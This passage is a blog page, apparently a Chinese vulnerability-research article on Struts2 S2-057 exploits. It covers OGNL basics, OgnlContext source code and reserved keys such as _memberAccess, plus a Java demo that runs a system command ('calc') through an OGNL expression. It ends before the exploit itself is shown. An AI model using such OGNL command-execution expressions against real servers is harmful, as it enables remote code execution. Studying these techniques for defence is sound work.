@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>struts2漏洞exp分析 | lufei&#39;s blog</title>
+  <meta name="description" content="已首发安全客 https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;1616900x00 前言从零开始分析struts2代码执行exp，其中不但包括了struts2自己设置的防护机制绕过，还有ognl防护绕过。以s2-057为列，因为有三个版本的exp，从易到难，比较全。文章中包含的前置内容也比较多。 0x01 前置知识OGNLstruts2命令执行是利用ognl表达式，所以必须了解o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2漏洞exp分析">
+<meta property="og:url" content="https://lufe1.cn/2018/10/08/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="lufei&#39;s blog">
+<meta property="og:description" content="已首发安全客 https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;1616900x00 前言从零开始分析struts2代码执行exp，其中不但包括了struts2自己设置的防护机制绕过，还有ognl防护绕过。以s2-057为列，因为有三个版本的exp，从易到难，比较全。文章中包含的前置内容也比较多。 0x01 前置知识OGNLstruts2命令执行是利用ognl表达式，所以必须了解o">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/1.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/2.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/3.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/4.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/5.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/6.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/7.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/8.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/9.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/10.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/11.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/12.png">
+<meta property="og:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/13.png">
+<meta property="article:published_time" content="2018-10-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-02T16:06:17.038Z">
+<meta property="article:author" content="lufei@湘ICP备17016147号-1">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.lufe1.cn/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/1.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://lufe1.cn/2018/10/08/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="lufei&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/lufeirider" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">lufei</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">网络安全</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81/">代码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/">原创工具</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/">工具修改</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E5%B7%A7/">技巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8C%96%E6%B4%9E/">挖洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90/">权限</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%B1%E5%A3%B3/">脱壳</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%98%B2%E5%BE%A1/">防御</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81/" rel="tag">代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/" rel="tag">原创工具</a><span class="tag-list-count">25</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/" rel="tag">工具修改</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">恶意代码分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%96%E6%B4%9E/" rel="tag">挖洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90/" rel="tag">权限</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3/" rel="tag">脱壳</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%98%B2%E5%BE%A1/" rel="tag">防御</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-struts2漏洞exp分析" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      struts2漏洞exp分析
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/10/08/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/" class="article-date">
+	  <time datetime="2018-10-07T16:00:00.000Z" itemprop="datePublished">2018-10-08</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/10/08/struts2%E6%BC%8F%E6%B4%9Eexp%E5%88%86%E6%9E%90/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="已首发安全客-https-www-anquanke-com-post-id-161690"><a href="#已首发安全客-https-www-anquanke-com-post-id-161690" class="headerlink" title="已首发安全客 https://www.anquanke.com/post/id/161690"></a>已首发安全客 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/161690">https://www.anquanke.com/post/id/161690</a></h1><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>从零开始分析struts2代码执行exp，其中不但包括了struts2自己设置的防护机制绕过，还有ognl防护绕过。以s2-057为列，因为有三个版本的exp，从易到难，比较全。文章中包含的前置内容也比较多。</p>
+<h1 id="0x01-前置知识OGNL"><a href="#0x01-前置知识OGNL" class="headerlink" title="0x01 前置知识OGNL"></a>0x01 前置知识OGNL</h1><p>struts2命令执行是利用ognl表达式，所以必须了解ognl。</p>
+<h2 id="1、HelloWorld"><a href="#1、HelloWorld" class="headerlink" title="1、HelloWorld"></a>1、HelloWorld</h2><p>OGNL有三大要素，分别是表达式、Context、根对象。</p>
+<p>使用ognl表达式的时候，是使用<code>Object ognl.Ognl.getValue(String expression, Map context, Object root)</code> api执行ognl表达式。<br>参数说明：<br><code>expression</code> ognl表达式<br><code>context</code> 是一个实现了Map接口的对象<br><code>root</code> bean对象</p>
+<p>来写一个helloworld，将上面抽象的东西实践一番。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> String realName;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRealName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.realName = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getRealName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.realName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Temp</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">        People root = <span class="keyword">new</span> People();</span><br><span class="line">        root.setAge(<span class="number">100</span>);</span><br><span class="line">        root.setRealName(<span class="string">&quot;lufei&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        context.put(<span class="string">&quot;nikename&quot;</span>, <span class="string">&quot;lufeirider&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//注意非根对象属性，需要加上#号</span></span><br><span class="line">        Object nikeName = Ognl.getValue(<span class="string">&quot;#nikename&quot;</span>,context,root);</span><br><span class="line">        System.out.println(nikeName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用跟对象属性时候，不需要加#号</span></span><br><span class="line">        Object realName = Ognl.getValue(<span class="string">&quot;realName&quot;</span>,context,root);</span><br><span class="line">        System.out.println(realName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//@[类全名(包括包路径)@[方法名|值名]]</span></span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Object execResult = Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)&quot;</span>, context);</span><br><span class="line">        System.out.println(execResult);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lufei</span><br><span class="line">lufeirider</span><br><span class="line">java.lang.ProcessImpl@1f17ae12</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、OgnlContext类"><a href="#2、OgnlContext类" class="headerlink" title="2、OgnlContext类"></a>2、OgnlContext类</h2><p>因为exp中常常利用赋值，改安全属性，而赋值操作在这个类中，所以好好看下这个类如何进行赋值与取值。（源码下载地址：<a target="_blank" rel="noopener" href="https://github.com/jkuhnert/ognl%EF%BC%89">https://github.com/jkuhnert/ognl）</a><br><code>public class OgnlContext extends Object implements Map</code>，它是实现了Map接口的类。</p>
+<p>看一下里面的主要方法和属性<br>重写了<code>Map</code>的<code>put</code>方法，遇到<code>RESERVED_KEYS</code>里面的key，然后根据key进行使用不同方法进行赋值。如果不在<code>RESERVED_KEYS</code>里面的，则放入一个叫<code>_values</code>的Map里面。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Object result;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (RESERVED_KEYS.containsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key.equals(OgnlContext.THIS_CONTEXT_KEY)) &#123;</span><br><span class="line">            result = getCurrentObject();</span><br><span class="line">            setCurrentObject(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (key.equals(OgnlContext.ROOT_CONTEXT_KEY)) &#123;</span><br><span class="line">                result = getRoot();</span><br><span class="line">                setRoot(value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (key.equals(OgnlContext.CONTEXT_CONTEXT_KEY)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;can&#x27;t change &quot;</span> + OgnlContext.CONTEXT_CONTEXT_KEY</span><br><span class="line">                            + <span class="string">&quot; in context&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (key.equals(OgnlContext.TRACE_EVALUATIONS_CONTEXT_KEY)) &#123;</span><br><span class="line">                        result = getTraceEvaluations() ? Boolean.TRUE : Boolean.FALSE;</span><br><span class="line">                        setTraceEvaluations(OgnlOps.booleanValue(value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (key.equals(OgnlContext.LAST_EVALUATION_CONTEXT_KEY)) &#123;</span><br><span class="line">                            result = getLastEvaluation();</span><br><span class="line">                            _lastEvaluation = (Evaluation) value;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (key.equals(OgnlContext.KEEP_LAST_EVALUATION_CONTEXT_KEY)) &#123;</span><br><span class="line">                                result = getKeepLastEvaluation() ? Boolean.TRUE : Boolean.FALSE;</span><br><span class="line">                                setKeepLastEvaluation(OgnlOps.booleanValue(value));</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (key.equals(OgnlContext.CLASS_RESOLVER_CONTEXT_KEY)) &#123;</span><br><span class="line">                                    result = getClassResolver();</span><br><span class="line">                                    setClassResolver((ClassResolver) value);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (key.equals(OgnlContext.TYPE_CONVERTER_CONTEXT_KEY)) &#123;</span><br><span class="line">                                        result = getTypeConverter();</span><br><span class="line">                                        setTypeConverter((TypeConverter) value);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (key.equals(OgnlContext.MEMBER_ACCESS_CONTEXT_KEY)) &#123;</span><br><span class="line">                                            result = getMemberAccess();</span><br><span class="line">                                            setMemberAccess((MemberAccess) value);</span><br><span class="line">                                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;unknown reserved key &#x27;&quot;</span> + key + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = _values.put(key, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>还重写了<code>get</code>方法，跟上面的类似。<code>Ognl.getValue(&quot;#ct[&#39;root&#39;]&quot;,context,root);</code>，<code>context[&#39;root&#39;]</code>就能获取到保留属性比如获取到保留属性<code>root temp.People@7eda2dbb</code>,而非在<code>_value</code>中获取。</p>
+<p>来看下保留字符</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CONTEXT_CONTEXT_KEY = <span class="string">&quot;context&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ROOT_CONTEXT_KEY = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String THIS_CONTEXT_KEY = <span class="string">&quot;this&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TRACE_EVALUATIONS_CONTEXT_KEY = <span class="string">&quot;_traceEvaluations&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String LAST_EVALUATION_CONTEXT_KEY = <span class="string">&quot;_lastEvaluation&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEEP_LAST_EVALUATION_CONTEXT_KEY = <span class="string">&quot;_keepLastEvaluation&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CLASS_RESOLVER_CONTEXT_KEY = <span class="string">&quot;_classResolver&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TYPE_CONVERTER_CONTEXT_KEY = <span class="string">&quot;_typeConverter&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String MEMBER_ACCESS_CONTEXT_KEY = <span class="string">&quot;_memberAccess&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>其中<code>_memberAccess</code>是访问权限控制，比较重要。</p>
+<p>设置访问权限</p>
